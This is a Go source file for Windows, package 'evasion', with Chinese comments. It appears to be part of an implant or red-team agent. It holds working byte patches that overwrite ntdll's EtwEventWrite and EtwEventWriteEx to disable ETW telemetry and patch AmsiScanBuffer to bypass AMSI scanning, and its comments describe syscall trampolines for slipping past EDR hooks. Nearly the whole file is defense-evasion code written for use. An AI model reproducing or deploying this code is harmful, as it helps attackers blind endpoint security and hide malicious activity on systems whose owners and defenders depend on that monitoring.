//go:build windows

// Package evasion 主机层对抗（Windows）：
//  1. ETW Patch：启动早期将 ntdll!EtwEventWrite/EtwEventWriteEx 置为"返回 0"，消除进程 ETW 遥测
//  2. AMSI Bypass：patch amsi!AmsiScanBuffer 返回 E_INVALIDARG，绕过 PowerShell/内存内容扫描
//  3. 直接/间接 Syscall：从 ntdll 解析 syscall 号（SSN），构建 trampoline 执行，
//     绕过 ntdll 函数体开头的 EDR userland hook（direct：自建 syscall 指令；
//     indirect：跳回 ntdll 内的 syscall 指令，返回地址落在 ntdll 内，规避调用方检查）。
package evasion

import (
	"errors"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Init 按编译期配置执行对抗初始化（无配置项时静默返回）。
func Init(etwOn, amsiOn bool, syscallMode string) error {
	if etwOn {
		if err := PatchETW(); err != nil {
			debug("ETW patch 失败: %v", err)
		}
	}
	if amsiOn {
		if err := PatchAMSI(); err != nil {
			debug("AMSI patch 失败: %v", err)
		}
	}
	if syscallMode != "none" {
		if err := PrepareTrampolines(syscallMode); err != nil {
			return fmt.Errorf("syscall trampoline 初始化失败: %v", err)
		}
	}
	return nil
}

func debug(format string, args ...interface{}) {
	// 静默模式重定向后输出不可见；保留给 verbose 构建
	fmt.Printf(format+"\n", args...)
}

// ===== 通用内存 patch =====

// patchBytes 将 proc 指向的机器码起始 len(patch) 字节覆盖为 patch（可执行内存写）。
func patchBytes(proc uintptr, patch []byte) error {
	if proc == 0 {
		return errors.New("目标函数地址为空")
	}
	var oldProtect uint32
	if err := windows.VirtualProtect(proc, uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
		return fmt.Errorf("VirtualProtect 失败: %v", err)
	}
	defer windows.VirtualProtect(proc, uintptr(len(patch)), oldProtect, &oldProtect)
	dst := (*[1 << 20]byte)(unsafe.Pointer(proc))
	for i, b := range patch {
		dst[i] = b
	}
	return nil
}

// ===== ETW Patch =====
// ntdll!EtwEventWrite 与 EtwEventWriteEx：函数首字节替换为 mov eax, 0; ret（6 字节），
// 返回 STATUS_SUCCESS 但不实际写入任何事件 → 该进程的 ETW 遥测被静默禁用。
var patchEtwWrite = []byte{0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3}

// PatchETW patch ntdll 的 ETW 事件写入入口。
func PatchETW() error {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	var firstErr error
	for _, name := range []string{"EtwEventWrite", "EtwEventWriteEx"} {
		p := ntdll.NewProc(name)
		if err := p.Find(); err != nil {
			continue
		}
		if err := patchBytes(p.Addr(), patchEtwWrite); err != nil {
			if firstErr == nil {
				firstErr = err
			}
			continue
		}
	}
	if firstErr != nil {
		return firstErr
	}
	return nil
}

// ===== AMSI Bypass =====
// amsi!AmsiScanBuffer：首字节替换为 mov eax, 0x80070057; ret（E_INVALIDARG）。
// AmsiInitialize 成功但扫描返回"参数无效" → 宿主视作不支持扫描而放行。
var patchAmsiScanBuffer = []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}

// PatchAMSI patch amsi.dll!AmsiScanBuffer（amsi.dll 未加载时尝试加载）。
func PatchAMSI() error {
	amsi := windows.NewLazySystemDLL("amsi.dll")
	proc := amsi.NewProc("AmsiScanBuffer")
	if err := proc.Find(); err != nil {
		// 进程内尚无 amsi.dll：显式加载后再解析
		if _, err := windows.LoadDLL("amsi.dll"); err != nil {
			return fmt.Errorf("amsi.dll 未加载且无法加载: %v", err)
		}
		amsi = windows.NewLazySystemDLL("amsi.dll")
		proc = amsi.NewProc("AmsiScanBuffer")
		if err := proc.Find(); err != nil {
			return fmt.Errorf("解析 AmsiScanBuffer 失败: %v", err)
		}
	}
	return patchBytes(proc.Addr(), patchAmsiScanBuffer)
}
